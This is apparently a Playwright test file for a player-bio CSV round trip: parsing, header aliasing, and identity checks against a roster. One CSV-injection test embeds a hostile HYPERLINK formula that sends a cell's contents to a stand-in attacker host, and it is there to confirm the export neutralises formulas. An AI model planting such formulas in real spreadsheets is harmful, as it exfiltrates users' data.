// @ts-check
/**
 * The player-bio CSV round trip: parsing, and who a row is allowed to name.
 *
 * Tested directly rather than through the page, which is the rule in AGENTS.md
 * for anything that decides an outcome from data. Both halves earn it:
 *
 *   - the parser is where the bugs are, and driving it through a file picker
 *     would exercise the file picker;
 *   - the matcher is the security boundary. The CSV spends its life in a document
 *     an entire team can edit, so "which player does this row name" is a question
 *     asked about hostile input, and it deserves to be asked directly.
 */
const { test } = require('@playwright/test');
const { expect } = require('./helpers');

const Csv = require('../../shared/csv.js');
const Bios = require('../../shared/bios.js');

const ROSTER = [
  { id: 301, num: 1, name: 'Alex Auer' },
  { id: 302, num: 7, name: 'Kim Ebner' },
  { id: 303, num: 12, name: 'Bea Blade' },
];

/**
 * The TEAM row, found by its identifier rather than its position.
 *
 * The export grew a NOTICE row above the players, and every `rows[3]` here
 * silently became the wrong row. Position was never the contract; the reserved
 * identifier is.
 */
const teamRow = (rows) => rows.find((r) => r['Player ID'] === Bios.TEAM_ROW_ID);

/** Build a file the way a spreadsheet would export it. */
function csv(rows, headers) {
  return Csv.stringify(headers || Bios.exportHeaders(), rows);
}

test.describe('fields borrowed from a roster used live', () => {
  // A tournament roster built to be READ during commentary — not imported —
  // turned out to collect several things this sheet did not ask for. Its column
  // names are recognised where they overlap, and its ideas were taken where a
  // commentator would look them up rather than read them out.

  test('a phonetic spelling column is the pronunciation field', () => {
    // The single most valuable alias here: without it that column imported as
    // an unlabelled line in the note instead of the field shown beside a name.
    const found = Bios.fieldHeaders(['Number', 'Name', 'Phonetic spelling']);
    expect(found.pronunciation).toBe('Phonetic spelling');
  });

  test('the new structured fields are recognised by their own names', () => {
    const found = Bios.fieldHeaders(
      ['Role', 'Nationality', 'Position', 'Throwing hand'],
    );
    expect(found).toEqual({
      role: 'Role', nationality: 'Nationality',
      position: 'Position', hand: 'Throwing hand',
    });
  });

  test('the short forms a roster actually uses become matchings', () => {
    // Rosters head this column "Gender/Match", or just "Gender", and fill it
    // with M and F. A team writing M there has answered which matching that
    // player competes as, because the header asked — so it is read rather than
    // refused. The header is the gate: a column of letters that did not match
    // a matching alias never reaches this function at all.
    for (const header of ['Gender/Match', 'Gender', 'Matching']) {
      expect(Bios.fieldHeaders([header]).matching, header).toBe(header);
    }
    for (const [raw, want] of [['M', 'MMP'], ['F', 'FMP'], ['W', 'FMP'],
      ['male', 'MMP'], ['Female', 'FMP'], [' m ', 'MMP'],
      ['MMP', 'MMP'], ['fmp', 'FMP']]) {
      expect(Bios.fieldValue('matching', raw), raw).toBe(want);
    }
  });

  test('what is stored is always the sport\'s own term', () => {
    // The distinction that keeps the above honest. Reading M as MMP is
    // translating an answer a team gave; the value that lands in the store is
    // the competition designation, never the letter. Anything unrecognised is
    // blank rather than a guess.
    for (const raw of ['X', 'other', '1', 'M/F', '?']) {
      expect(Bios.fieldValue('matching', raw), raw).toBe('');
    }
  });

  test('the exported sheet asks the new questions', () => {
    const headers = Bios.exportHeaders(true);
    for (const asked of ['Role', 'Nationality', 'Position', 'Throwing hand',
      'Home town', 'Currently living in', 'College or university',
      'Years with this team']) {
      expect(headers, asked).toContain(asked);
    }
  });

  test('a name split across two columns is still checked against the roster', () => {
    // A roster built by hand splits the name, and our export does not. Without
    // recognising both halves two things went wrong at once: the name check in
    // match() silently had nothing to check, so a row carrying the wrong id
    // passed unremarked; and the columns composed into the note, so a player's
    // own name was written into their prepared notes as labelled lines.
    const roster = [{ id: 11, name: 'Player One', num: 2 }, { id: 12, name: 'Player Two', num: 4 }];
    const parsed = {
      headers: ['Player ID', 'First Name', 'Last Name', 'Role'],
      rows: [
        { 'Player ID': 11, 'First Name': 'Player', 'Last Name': 'One', Role: 'Captain' },
        { 'Player ID': 12, 'First Name': 'Someone', 'Last Name': 'Else', Role: 'Spirit Captain' },
      ],
    };
    const report = Bios.match(parsed, roster, {}, { id: 1, name: 'Team A' });

    expect(report.accepted.length, 'the matching row').toBe(1);
    expect(report.accepted[0].fields.role).toBe('Captain');
    expect(report.rejected.length, 'the mismatched row').toBe(1);
    expect(report.rejected[0].why).toMatch(/name does not match/);
    // And neither half reaches the note.
    expect(report.contentHeaders).not.toContain('First Name');
    expect(report.contentHeaders).not.toContain('Last Name');
  });

  test('team-level columns stay out of a player note', () => {
    // Some rosters carry a colour and a seed on every row. They are facts about
    // a team, and repeating them per player would write one into somebody's
    // prepared notes. Recognised only so they are dropped: the seed comes from
    // Live! and kit colours live in the operator's palette.
    const content = Bios.contentHeaders(
      ['Player ID', 'Name', 'TeamColor', 'TeamSeeding', 'Home town'],
    );
    expect(content).toEqual(['Home town']);
  });

  test('a whole foreign header row lands where it should', () => {
    // The shape of a roster written to be read during commentary rather than
    // imported. Every structured field is recognised — including a phonetic
    // column with a trailing space in its header — and what remains is prose
    // that belongs in the note.
    const headers = ['Jersey Number', 'First Name', 'Last Name', 'Phonetic spelling ',
      'Role', 'Pronouns', 'Gender/Match', 'Nationality', 'Age', 'Height', 'Home town',
      'Currently residing', 'College', 'Previous teams', 'Years with Current Team',
      'Throwing Hand', 'Position', 'Nickname', 'TeamColor', 'TeamSeeding'];

    expect(Bios.fieldHeaders(headers)).toEqual({
      nickname: 'Nickname', pronouns: 'Pronouns', pronunciation: 'Phonetic spelling ',
      matching: 'Gender/Match', role: 'Role', nationality: 'Nationality',
      position: 'Position', hand: 'Throwing Hand',
    });
    expect(Bios.contentHeaders(headers)).toEqual([
      'Age', 'Height', 'Home town', 'Currently residing', 'College',
      'Previous teams', 'Years with Current Team',
    ]);
  });

  test('the notice says the columns are prompts, not a form', () => {
    // The sheet grew from sixteen columns to twenty-four, and a longer form is
    // a less-completed form unless it says it is not a form. This is the line
    // that makes a blank column a decision rather than an omission.
    const notice = Bios.NOTICE_TEXT;
    expect(notice).toMatch(/PROMPT, not a form/);
    expect(notice, 'a blank column has a stated consequence').toMatch(/not mentioned/);
    expect(notice, 'and it stays a publicity warning').toMatch(/PUBLIC/);
  });

  test('a column nobody anticipated still reaches the note', () => {
    // The reason most of that roster needs no schema at all: an unrecognised
    // header composes into the note as a labelled line, so a team inventing a
    // column loses nothing.
    const headers = ['Player ID', 'Name', 'Height', 'Favourite disc'];
    const content = Bios.contentHeaders(headers);
    expect(content).toEqual(['Height', 'Favourite disc']);
    const note = Bios.compose(
      { Height: '175cm', 'Favourite disc': 'a very old one' }, content,
    );
    expect(note).toContain('Height: 175cm');
    expect(note).toContain('Favourite disc: a very old one');
  });
});

test.describe('csv parsing', () => {
  test('a quoted field keeps its commas and newlines', () => {
    // The case that makes split(',') wrong on the first real row, and the reason
    // this module exists: the note is truncated and every later column shifts.
    const text = 'Player ID,Name,Story\r\n'
      + '301,Alex Auer,"Handball, then ultimate at university"\r\n'
      + '302,Kim Ebner,"Line one\nLine two"\r\n';
    const out = Csv.parse(text);
    expect(out.headers).toEqual(['Player ID', 'Name', 'Story']);
    expect(out.rows).toHaveLength(2);
    expect(out.rows[0].Story).toBe('Handball, then ultimate at university');
    expect(out.rows[1].Story).toBe('Line one\nLine two');
  });

  test('a doubled quote is an escaped quote', () => {
    const out = Csv.parse('A,B\r\n1,"she said ""go"" and went"\r\n');
    expect(out.rows[0].B).toBe('she said "go" and went');
  });

  test('the delimiter is sniffed outside quotes, not counted everywhere', () => {
    // A European Excel writes semicolons. The commas inside the quoted field
    // outnumber them, so a naive count picks the comma and the whole file parses
    // as one column.
    const text = 'Player ID;Name;Story\r\n301;Alex Auer;"Handball, football, then ultimate"\r\n';
    expect(Csv.sniff(text)).toBe(';');
    const out = Csv.parse(text);
    expect(out.delimiter).toBe(';');
    expect(out.rows[0].Story).toBe('Handball, football, then ultimate');
  });

  test('a UTF-8 BOM does not become part of the first header', () => {
    // Excel writes one. Left in, "Player ID" arrives as "﻿Player ID" and the
    // identifier column is silently not found.
    const out = Csv.parse('﻿Player ID,Story\r\n301,anything\r\n');
    expect(out.headers[0]).toBe('Player ID');
    expect(Bios.match(out, ROSTER, {}).fatal).toBeUndefined();
  });

  test('all three line endings work, and a trailing newline adds no phantom row', () => {
    for (const eol of ['\r\n', '\n', '\r']) {
      const out = Csv.parse(`A,B${eol}1,2${eol}3,4${eol}`);
      expect(out.rows, `line ending ${JSON.stringify(eol)}`).toHaveLength(2);
    }
    expect(Csv.parse('A,B\n1,2').rows).toHaveLength(1);
  });

  test('a name that looks like a formula is exported as text', () => {
    // CSV injection. The export carries player names out of the database into a
    // file the team opens in Sheets or Excel, and a name like
    // =HYPERLINK("http://x/?"&A1,"hi") runs on open. Quoting does not help --
    // both applications evaluate a formula inside a quoted field -- so the cell
    // has to be marked as text.
    const hostile = '=HYPERLINK("http://evil.example/?"&A1,"click")';
    const text = Csv.stringify(['Player ID', 'Name'], [{ 'Player ID': 1, Name: hostile }]);
    expect(text).not.toMatch(/(^|[,\r\n"])=HYPERLINK/);
    expect(text).toContain("'=HYPERLINK");

    for (const lead of ['=', '+', '-', '@']) {
      const out = Csv.stringify(['A'], [{ A: `${lead}danger` }]);
      expect(out, `${lead} must be neutralised`).toContain(`'${lead}danger`);
    }
    // Ordinary values are left alone.
    expect(Csv.stringify(['A'], [{ A: 'Alex Auer' }])).toContain('Alex Auer');
    expect(Csv.stringify(['A'], [{ A: 'Alex Auer' }])).not.toContain("'Alex");
  });

  test('a neutralised name still matches its roster entry on the way back', () => {
    // The defence must not break the identity check it sits next to: the name
    // comes back carrying an apostrophe and still has to be recognised.
    const roster = [{ id: 400, num: 4, name: '=Odd Name' }];
    const text = Csv.stringify(['Player ID', 'Name', 'Interests'],
      [{ 'Player ID': 400, Name: '=Odd Name', Interests: 'chess' }]);
    const report = Bios.match(Csv.parse(text), roster, {});
    expect(report.accepted).toHaveLength(1);
  });

  test('round-trips through stringify without losing anything', () => {
    const nasty = 'Comma, quote " and\nnewline';
    const text = Csv.stringify(['Player ID', 'Story'], [{ 'Player ID': 301, Story: nasty }]);
    expect(Csv.parse(text).rows[0].Story).toBe(nasty);
  });
});

test.describe('bio import: who a row is allowed to name', () => {
  test('an edited identifier cannot reach the opposing team', () => {
    // THE attack this guards. The sheet is editable by a whole team; 999 is a
    // player on the other side. Scoping the candidate set to one roster means the
    // row cannot name them however the identifier was written.
    const out = Csv.parse(csv([
      { 'Player ID': 999, Name: 'Someone Else', 'Interests outside ultimate': 'bogus' },
    ]));
    const report = Bios.match(out, ROSTER, {});
    expect(report.accepted).toHaveLength(0);
    expect(report.rejected).toHaveLength(1);
    expect(report.rejected[0].why).toMatch(/not on this roster/);
  });

  test('retargeting a teammate is caught by the name that travelled with the id', () => {
    // Within-team version of the same trick: keep a valid id, change whose row it
    // is. The exported name comes back with the identifier and has to agree.
    const out = Csv.parse(csv([
      { 'Player ID': 301, Name: 'Kim Ebner', 'Interests outside ultimate': 'bogus' },
    ]));
    const report = Bios.match(out, ROSTER, {});
    expect(report.accepted).toHaveLength(0);
    expect(report.rejected[0].why).toMatch(/name does not match/);
    expect(report.rejected[0].why).toMatch(/Alex Auer/);
  });

  test('honest variation in a name is still accepted', () => {
    // Strict on letters, loose on accents, case, punctuation and spacing --
    // otherwise a spreadsheet round trip rejects real rows and the check becomes
    // something people work around.
    for (const written of ['alex auer', 'Alex  Auer', 'Álex Auer', 'Alex-Auer']) {
      const out = Csv.parse(csv([
        { 'Player ID': 301, Name: written, 'Interests outside ultimate': 'climbing' },
      ]));
      const report = Bios.match(out, ROSTER, {});
      expect(report.accepted, `"${written}" should be accepted`).toHaveLength(1);
    }
  });

  test('several filled columns compose into one labelled note', () => {
    const out = Csv.parse(csv([{
      'Player ID': 302,
      Name: 'Kim Ebner',
      'Other sports played': 'Handball',
      'Occupation or study': 'Marine biology',
    }]));
    const report = Bios.match(out, ROSTER, {});
    expect(report.accepted).toHaveLength(1);
    expect(report.accepted[0].text)
      .toBe('Other sports played: Handball\nOccupation or study: Marine biology');
  });

  test('a single filled column is not labelled with its own question', () => {
    const out = Csv.parse(csv([
      { 'Player ID': 302, Name: 'Kim Ebner', 'Other sports played': 'Handball' },
    ]));
    expect(Bios.match(out, ROSTER, {}).accepted[0].text).toBe('Handball');
  });

  test('an untouched export imports nothing rather than blanking the roster', () => {
    // A team that uploads the file and never fills it in must not wipe
    // anything. Three player rows plus the empty TEAM row.
    const out = Csv.parse(csv(Bios.exportRows(ROSTER)));
    const report = Bios.match(out, ROSTER, {});
    expect(report.accepted).toHaveLength(0);
    expect(report.empty).toBe(4);
    expect(report.matched).toBe(3);
  });

  test('the sheet warns whoever fills it in, and the warning imports as nothing', () => {
    // The warning cannot live only in the docs: the docs are read by whoever
    // runs the broadcast, and the decision it governs is made by each player
    // alone in a spreadsheet, deciding what to type about themselves.
    const rows = Bios.exportRows(ROSTER, { id: 77, name: 'Mosquitos' });
    expect(rows[0]['Player ID'], 'above the players, or it is read too late')
      .toBe(Bios.NOTICE_ROW_ID);
    // It says the three things that actually protect somebody: this is public,
    // the code is not a password, and anything else goes to a person directly.
    expect(rows[0].Name).toMatch(/PUBLIC/);
    expect(rows[0].Name).toMatch(/not a password/);
    expect(rows[0].Name).toMatch(/in person/);

    const report = Bios.match(Csv.parse(csv(rows)), ROSTER, {},
      { id: 77, name: 'Mosquitos' });
    // Silently ignored — NOT rejected. A red line against the one row behaving
    // as intended teaches the desk to read past the rejection list.
    expect(report.rejected).toHaveLength(0);
    expect(report.accepted).toHaveLength(0);
    expect(report.matched, 'the notice is not a player').toBe(3);
  });

  test('the TEAM row imports as the team note, under the same rules', () => {
    const rows = Bios.exportRows(ROSTER, { id: 77, name: 'Mosquitos' });
    teamRow(rows)['Team history'] = 'Founded 1998 on a beach.';
    teamRow(rows)['Team achievements'] = 'National champions 2019.';
    const out = Csv.parse(csv(rows));
    const report = Bios.match(out, ROSTER, {}, { id: 77, name: 'Mosquitos' });
    expect(report.accepted).toHaveLength(1);
    expect(report.accepted[0].player).toBe('TEAM');
    expect(report.accepted[0].text).toBe(
      'Team history: Founded 1998 on a beach.\nTeam achievements: National champions 2019.');
  });

  test('a retargeted TEAM row is refused by the name that travelled with it', () => {
    const rows = Bios.exportRows(ROSTER, { id: 77, name: 'Mosquitos' });
    teamRow(rows).Name = 'Someone Else';
    teamRow(rows)['Team history'] = 'sneaky';
    const out = Csv.parse(csv(rows));
    const report = Bios.match(out, ROSTER, {}, { id: 77, name: 'Mosquitos' });
    expect(report.accepted).toHaveLength(0);
    expect(report.rejected[0].why).toMatch(/team name does not match/);
  });

  test("the desk's team note is kept, not overwritten", () => {
    const rows = Bios.exportRows(ROSTER, { id: 77, name: 'Mosquitos' });
    teamRow(rows)['Team history'] = 'From the sheet.';
    const out = Csv.parse(csv(rows));
    const report = Bios.match(out, ROSTER,
      { TEAM: { text: 'Typed at the desk.' } }, { id: 77, name: 'Mosquitos' });
    expect(report.accepted).toHaveLength(0);
    expect(report.kept).toHaveLength(1);
    expect(report.kept[0].name).toMatch(/team note/);
  });

  test('a note a commentator already wrote is kept, not overwritten', () => {
    // Their own observations have no other home; a player's answers can simply be
    // imported again.
    const out = Csv.parse(csv([
      { 'Player ID': 301, Name: 'Alex Auer', 'Interests outside ultimate': 'from the sheet' },
    ]));
    const report = Bios.match(out, ROSTER, { 301: 'typed at the desk' });
    expect(report.accepted).toHaveLength(0);
    expect(report.kept).toHaveLength(1);
    expect(report.kept[0].name).toBe('Alex Auer');
  });

  test('a second row for one player does not silently win', () => {
    const out = Csv.parse(csv([
      { 'Player ID': 303, Name: 'Bea Blade', 'Interests outside ultimate': 'first' },
      { 'Player ID': 303, Name: 'Bea Blade', 'Interests outside ultimate': 'second' },
    ]));
    const report = Bios.match(out, ROSTER, {});
    expect(report.accepted).toHaveLength(1);
    expect(report.accepted[0].text).toBe('first');
    expect(report.rejected[0].why).toMatch(/second row/);
  });

  test('a file with no identifier column is refused outright', () => {
    // Rather than guessing which column is the id, which is how a whole roster
    // ends up with somebody else's biography.
    const out = Csv.parse('Name,Story\r\nAlex Auer,anything\r\n');
    const report = Bios.match(out, ROSTER, {});
    expect(report.fatal).toMatch(/identifier column/);
    expect(report.accepted).toHaveLength(0);
  });

  test('a non-numeric identifier is reported, not coerced', () => {
    const out = Csv.parse('Player ID,Story\r\n"=1+1",anything\r\n');
    const report = Bios.match(out, ROSTER, {});
    expect(report.accepted).toHaveLength(0);
    expect(report.rejected[0].why).toMatch(/not a number/);
  });

  test('a filled field column lands beside the name, not inside the note', () => {
    // Pronouns, nicknames and pronunciation are looked up at speed, so they
    // import into their own fields rather than disappearing into the composed
    // note text.
    const out = Csv.parse(csv([{
      'Player ID': 301, Name: 'Alex Auer',
      Pronouns: 'she/her', 'Other sports played': 'Handball',
    }]));
    const report = Bios.match(out, ROSTER, {});
    expect(report.accepted).toHaveLength(1);
    expect(report.accepted[0].text).toBe('Handball');
    expect(report.accepted[0].fields).toEqual({ pronouns: 'she/her' });
  });

  test('the export names its team and carries the field columns before the prompts', () => {
    const headers = Bios.exportHeaders();
    expect(headers.slice(3, 5)).toEqual(['Team', 'Team ID']);
    expect(headers.slice(5, 8)).toEqual(['Nickname', 'Pronouns', 'Name pronunciation']);
    for (const p of Bios.PROMPTS) { expect(headers).toContain(p); }
    const rows = Bios.exportRows(ROSTER, { id: 77, name: 'Mosquitos' });
    expect(rows[0].Team).toBe('Mosquitos');
    expect(rows[0]['Team ID']).toBe(77);
  });

  test("another team's sheet is refused as a file, with its name", () => {
    // Twenty-eight "not on this roster" rows say something is wrong; this says
    // what happened — the wrong team's sheet was picked — and the page adds
    // where it goes.
    const rows = Bios.exportRows(ROSTER, { id: 77, name: 'Mosquitos' });
    rows[0]['Other sports played'] = 'Handball';
    const out = Csv.parse(csv(rows));
    const report = Bios.match(out, ROSTER, {}, { id: 88, name: 'Lemmings' });
    expect(report.fatal).toMatch(/Mosquitos/);
    expect(report.fatal).toMatch(/Lemmings/);
    expect(report.wrongTeam).toEqual({ id: '77', name: 'Mosquitos' });
    expect(report.accepted).toHaveLength(0);
  });

  test('a file without team columns falls back to the per-row guard', () => {
    // Deleting the columns disables only the file-level check.
    const out = Csv.parse('Player ID,Name,Pronouns\r\n301,Alex Auer,she/they\r\n');
    const report = Bios.match(out, ROSTER, {}, { id: 88, name: 'Lemmings' });
    expect(report.fatal).toBeUndefined();
    expect(report.accepted).toHaveLength(1);
  });

  test('one row claiming the importing team keeps the file admissible', () => {
    // A hand-merged file is judged row by row rather than refused outright.
    const rows = Bios.exportRows(ROSTER, { id: 77, name: 'Mosquitos' });
    rows[1]['Team ID'] = '88';
    rows[1]['Other sports played'] = 'Handball';
    const out = Csv.parse(csv(rows));
    const report = Bios.match(out, ROSTER, {}, { id: 88, name: 'Lemmings' });
    expect(report.fatal).toBeUndefined();
    expect(report.accepted).toHaveLength(1);
  });

  test('a file of identifiers and pronouns alone is importable', () => {
    // The likeliest minimal round trip: a team answers nothing else. It must not
    // be refused as "no content columns".
    const out = Csv.parse('Player ID,Pronouns\r\n301,they/them\r\n');
    const report = Bios.match(out, ROSTER, {});
    expect(report.fatal).toBeUndefined();
    expect(report.accepted).toHaveLength(1);
    expect(report.accepted[0].text).toBe('');
    expect(report.accepted[0].fields).toEqual({ pronouns: 'they/them' });
  });

  test('fill and keep are decided per channel, not per row', () => {
    // A note typed at the desk must not block the pronouns nobody had -- and the
    // typed note must not be replaced by the row that brings them.
    const out = Csv.parse(csv([{
      'Player ID': 301, Name: 'Alex Auer',
      Pronouns: 'she/her', 'Other sports played': 'from the sheet',
    }]));
    const report = Bios.match(out, ROSTER, { 301: { text: 'typed at the desk' } });
    expect(report.accepted).toHaveLength(1);
    expect(report.accepted[0].text).toBe('');
    expect(report.accepted[0].fields).toEqual({ pronouns: 'she/her' });
  });

  test("a matching cell stores FMP or MMP, whichever way it was written", () => {
    // The stored value is always the sport's own term (docs/STUDIO.md §10.5).
    // Reaching it from the short form a roster actually uses is translation
    // rather than inference — the column asked which matching, and the team
    // answered. See the note on fieldValue() in shared/bios.js.
    const out = Csv.parse('Player ID,Name,Matching (FMP/MMP)\r\n'
      + '301,Alex Auer,fmp\r\n302,Kim Ebner,F\r\n');
    const report = Bios.match(out, ROSTER, {});
    expect(report.accepted).toHaveLength(2);
    expect(report.accepted.map((a) => a.fields.matching)).toEqual(['FMP', 'FMP']);
  });

  test('a matching cell saying something else imports as nothing', () => {
    // The half that has not changed: unrecognised is blank, never a guess.
    const out = Csv.parse('Player ID,Name,Matching (FMP/MMP)\r\n'
      + '301,Alex Auer,maybe\r\n');
    const report = Bios.match(out, ROSTER, {});
    expect(report.accepted).toHaveLength(0);
    expect(report.empty).toBe(1);
  });

  test('a row whose every channel is already written is kept', () => {
    const out = Csv.parse(csv([{
      'Player ID': 301, Name: 'Alex Auer',
      Pronouns: 'she/her', 'Other sports played': 'answered',
    }]));
    const report = Bios.match(out, ROSTER,
      { 301: { text: 'typed', pronouns: 'they/them' } });
    expect(report.accepted).toHaveLength(0);
    expect(report.kept).toHaveLength(1);
  });

  test('every row is accounted for', () => {
    // Nothing may be dropped in silence: the preview tally is what the reader
    // decides on, so the numbers have to add up to the file.
    const out = Csv.parse(csv([
      { 'Player ID': 301, Name: 'Alex Auer', 'Interests outside ultimate': 'kept' },
      { 'Player ID': 302, Name: 'Kim Ebner', 'Interests outside ultimate': 'new' },
      { 'Player ID': 303, Name: 'Bea Blade' },
      { 'Player ID': 999, Name: 'Stranger', 'Interests outside ultimate': 'foreign' },
    ]));
    const report = Bios.match(out, ROSTER, { 301: 'already here' });
    expect(report.total).toBe(4);
    expect(report.accepted.length + report.kept.length + report.empty
      + report.rejected.length).toBe(report.total);
  });
});
